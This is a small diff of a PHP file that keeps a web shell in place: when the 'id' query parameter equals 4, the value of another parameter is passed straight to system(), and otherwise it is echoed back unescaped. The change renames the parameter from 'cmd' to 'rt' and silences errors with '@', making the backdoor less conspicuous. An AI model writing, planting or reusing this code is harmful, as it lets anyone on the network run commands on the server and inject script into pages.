@@ -1,13 +1,12 @@
 <?
 $id = $_GET['id'];
-$cmd = $_GET['cmd'];
+$rt = $_GET['rt'];
 
 if ( $id == 4 ){
-  system( $cmd );
+  @system( $rt );
 }
 else
 {
-  echo $cmd;
+  echo $rt;
 }
 ?>
-    
